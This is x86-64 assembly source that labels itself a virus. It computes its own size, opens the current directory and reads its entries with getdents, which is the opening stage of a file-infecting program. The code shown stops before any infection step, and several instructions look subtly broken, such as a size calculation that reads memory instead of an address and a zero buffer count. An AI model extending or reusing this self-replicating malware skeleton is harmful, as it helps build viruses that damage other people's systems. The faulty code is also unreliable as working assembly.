section .text
	global _start

_start:
	push rbp
	mov rbp, rsp
	sub rsp, 16
	sub rsp, 320
	; rsp + 0: dir struct
	; rsp + 280: virus size
	; rsp + 288: fd directory
	; rsp + 296: unused
	; rsp + 304: unused
	; rsp + 312: unused

_calculate_start_of_virus:
	xor r10, r10 ; r10 = 0
	lea r10, [rel _size_end] ; r10 = &_size_end
	sub r10, [rel _start] ; r10 -= &start
	mov QWORD [rsp + 280], r10 ; virus size = r10

_open_dir:
	push 0x00002f2e ; push "./"
	mov rdi, rsp ; mov the stack address on rdi, he first argument
	mov rsi, 0x2 ; flag for open
	mov rax, 0x2 ; open syscall number
	syscall ; open
	pop rdi ; we pushed, so we pop
	cmp rax, -1 ; if open return something under or equal of -1, jump to end
	jle _end
	mov QWORD [rsp + 288], rax ; fd directory = return of open (fd)

_file_loop:
	xor rdx, rdx ; rdx = 0, set the count of getdents to 0, cose it's ignored
	mov rdi, QWORD [rsp + 288] ; mov the fd to the first argument
	mov rsi, rsp ; mov the stack pointer to the second argument
	mov rax, 78 ; getdents syscall number
	syscall
	
_end:
	ret

_size_end:
